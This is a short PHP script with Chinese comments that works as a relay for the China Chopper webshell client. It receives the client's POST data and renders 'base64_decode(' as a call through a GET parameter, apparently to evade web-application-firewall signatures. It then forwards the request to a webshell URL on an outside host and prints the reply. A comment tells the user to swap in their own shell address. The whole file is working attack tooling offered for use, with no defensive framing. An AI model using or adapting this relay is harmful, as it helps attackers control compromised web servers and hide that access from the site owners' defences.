<?php
$webshell="http://www.phpinfo.me/plus/helen.php";//把这里改成你的shell地址
$webshell=$webshell."?&1141056911=base64_decode";

$da=$_POST;
$data = $da;
@$data=str_replace("base64_decode(",'$_GET[1141056911](',$data); //接收菜刀的post，并把base64_decode替换成$_GET[1141056911](

//print_r($data);

$data = http_build_query($data);  
$opts = array (  
'http' => array (  
'method' => 'POST',  
'header'=> "Content-type: application/x-www-form-urlencoded\r\n" .  
"Content-Length: " . strlen($data) . "\r\n",  
'content' => $data)
);
  
$context = stream_context_create($opts);  
$html = @file_get_contents($webshell, false, $context); //发送post  
echo $html;